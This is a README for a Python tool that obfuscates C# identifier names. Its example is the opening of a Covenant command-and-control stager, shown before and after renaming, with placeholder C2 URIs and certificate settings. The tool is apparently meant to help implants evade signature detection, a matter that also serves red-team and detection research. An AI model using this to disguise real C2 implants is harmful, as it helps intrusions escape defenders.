# Sharp-Obfuscate
Obfuscate C# Function, Parameter, and Variable Names
```
usage: Obfuscator.py [-h] [-o OutFile] File

Obfuscate C# Function,Parameter, and Variable names

positional arguments:
  File

optional arguments:
  -h, --help  show this help message and exit
  -o OutFile
```

### Covenant Stager Example:
*Before:*
```
namespace GruntStager
{
    public class GruntStager
    {
        public GruntStager()
        {
            ExecuteStager();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GruntStager();
        }
        public static void Execute()
        {
            new GruntStager();
        }
        public void ExecuteStager()
        {
            try
            {
                List<string> CovenantURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
                string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
```
*After:*
```
namespace FhoawtKmEOy
{
    public class FhoawtKmEOy
    {
        public FhoawtKmEOy()
        {
            LLMfvkoIeCw();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new FhoawtKmEOy();
        }
        public static void IDOwRYTBsNu()
        {
            new FhoawtKmEOy();
        }
        public void LLMfvkoIeCw()
        {
            try
            {
                List<string> PAZMqYZnSfh = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
                string UgVrubOuWpZ = @"{{REPLACE_COVENANT_CERT_HASH}}";
                                List<string> BaBXRDLmiZY = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                                List<string> TdYgUuiktEm = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                                List<string> NnYmTynxnDg = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                                string TVwttROEYsh = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string LsLiXAiopTK = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool VwqyKkqWiLI = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool RYSwCDRsvFC = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
...
```
